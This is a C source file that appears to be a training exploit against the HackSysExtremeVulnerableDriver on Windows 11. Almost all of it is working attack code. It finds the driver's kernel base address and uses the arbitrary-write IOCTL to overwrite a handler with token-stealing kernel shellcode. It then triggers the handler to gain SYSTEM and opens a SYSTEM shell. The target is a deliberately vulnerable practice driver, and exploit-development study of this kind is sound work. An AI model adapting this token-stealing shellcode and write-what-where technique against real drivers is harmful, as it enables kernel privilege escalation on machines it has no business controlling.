/*
HEVD TriggerArbitraryWrite
OS Name	Microsoft Windows 11 Pro
Version	10.0.26100 Build 26100

based on: https://wetw0rk.github.io/posts/0x04-writing-what-where-in-the-kernel/
*/

#include <Windows.h>
#include <shlwapi.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "Shlwapi.lib")

#define HEVD_WWW	0x22200B
#define HEVD_TARGET 0x22206F

typedef struct _WRITE_WHAT_WHERE
{
	uint64_t *What;
	uint64_t *Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

LPVOID GetKernelModuleBase(PCHAR pKernelModule)
{
	char pcDriver[1024] = { 0 };
	LPVOID lpvTargetDriver = NULL;
	LPVOID* lpvDrivers = NULL;
	DWORD dwCB = 0;
	DWORD dwDrivers = 0;
	DWORD i = 0;

	EnumDeviceDrivers(NULL, dwCB, &dwCB);
	if (dwCB <= 0)
		return NULL;

	lpvDrivers = (LPVOID*)malloc(dwCB * sizeof(LPVOID));
	if (lpvDrivers == NULL)
		return NULL;

	if (EnumDeviceDrivers(lpvDrivers, dwCB, &dwCB))
	{
		dwDrivers = dwCB / sizeof(LPVOID);
		for (i = 0; i < dwDrivers; i++)
			if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver)))
				if (StrStrA(pcDriver, pKernelModule) != NULL)
					lpvTargetDriver = lpvDrivers[i];
	}

	free(lpvDrivers);

	return lpvTargetDriver;
}

int CheckWin(VOID)
{
	DWORD win = 0;
	DWORD dwLen = 0;
	CHAR* cUsername = NULL;

	GetUserNameA(NULL, &dwLen);

	if (dwLen > 0) {
		cUsername = (CHAR*)malloc(dwLen * sizeof(CHAR));
	}
	else {
		printf("[-] Failed to allocate buffer for username check\n");
		return -1;
	}

	GetUserNameA(cUsername, &dwLen);

	win = strcmp(cUsername, "SYSTEM");
	free(cUsername);

	return (win == 0) ? win : -1;
}

void SendPayload(HANDLE hDevice, uint64_t what, uint64_t where)
{
	DWORD bytesReturned;
	WRITE_WHAT_WHERE www = { 0 };

	www.Where = (uint64_t *)where;
	www.What = &what;
	printf("[*] Writing 0x%p to 0x%p\n", *www.What, www.Where);

	DeviceIoControl(
		hDevice,
		HEVD_WWW,
		&www,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0x00,
		&bytesReturned,
		NULL
	);
}

int Exploit(HANDLE hDevice)
{
	DWORD bytesReturned		= 0;
	LPVOID pHEVDBase		= NULL;
	DWORD i					= 0;
	uint64_t target			= 0;
	uint64_t payload		= 0;

	CHAR rawBytes[60]		= { 0 };
	CHAR shellcode[] =
		/* ALIGNMENT */
		"\x90\x90"

		/* python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint (58 bytes) */
		"\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00" // movabs rax, qword ptr gs:[0x188]
		"\x48\x8b\x80\xb8\x00\x00\x00"                 // mov rax, qword ptr [rax + 0xb8]
		"\x48\x89\xc1"                                 // mov rcx, rax
		"\xb2\x04"                                     // mov dl, 4
		"\x48\x8b\x80\x48\x04\x00\x00"                 // mov rax, qword ptr [rax + 0x448]
		"\x48\x2d\x48\x04\x00\x00"                     // sub rax, 0x448
		"\x38\x90\x40\x04\x00\x00"                     // cmp byte ptr [rax + 0x440], dl
		"\x75\xeb"                                     // jne 0x1017
		"\x48\x8b\x90\xb8\x04\x00\x00"                 // mov rdx, qword ptr [rax + 0x4b8]
		"\x48\x89\x91\xb8\x04\x00\x00"                 // mov qword ptr [rcx + 0x4b8], rdx

		/* KERNEL RECOVERY */
		"\x48\x31\xc0"                         /* xor rax, rax */
		"\xc3";                                /* ret */
	DWORD shellcodeLength = (DWORD)sizeof(shellcode);

	pHEVDBase = GetKernelModuleBase("HEVD");
	if (pHEVDBase == NULL)
	{
		printf("[-] Failed to obtain the base address\n");
		return -1;
	}
	printf("[*] Base address of HEVD: 0x%p\n", pHEVDBase);

	target = (uint64_t)pHEVDBase + 0x85b14;
	printf("[*] Overwriting memory DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler: 0x%p\n", target);

	for (i = 0; i < shellcodeLength; i += sizeof(uint64_t))
	{
		sprintf(rawBytes, "0x%02x%02x%02x%02x%02x%02x%02x%02x", ((uint32_t)shellcode[i + 7] & 0xff),
			((uint32_t)shellcode[i + 6] & 0xff),
			((uint32_t)shellcode[i + 5] & 0xff),
			((uint32_t)shellcode[i + 4] & 0xff),
			((uint32_t)shellcode[i + 3] & 0xff),
			((uint32_t)shellcode[i + 2] & 0xff),
			((uint32_t)shellcode[i + 1] & 0xff),
			((uint32_t)shellcode[i + 0] & 0xff));

		payload = strtoull(rawBytes, NULL, 16);
		SendPayload(hDevice, payload, target);
		memset(rawBytes, '\0', 60);
		target += sizeof(uint64_t);
	}

	printf("[+] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler...\n");
	DeviceIoControl(
		hDevice,
		HEVD_TARGET,
		NULL,
		0x00,
		NULL,
		0x00,
		&bytesReturned,
		NULL
	);

	return CheckWin();
}


int main()
{
	HANDLE hDevice = NULL;
	hDevice = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		(GENERIC_READ | GENERIC_WRITE),
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to get handle!\n");
		return -1;
	}

	if (Exploit(hDevice) == 0)
	{
		printf("[+] Exploitation succesfull!\n");
		system("cmd.exe");
	}
	else
	{
		printf("[-] Explotiation failed\n");
		return -1;
	}

	return 0;
}
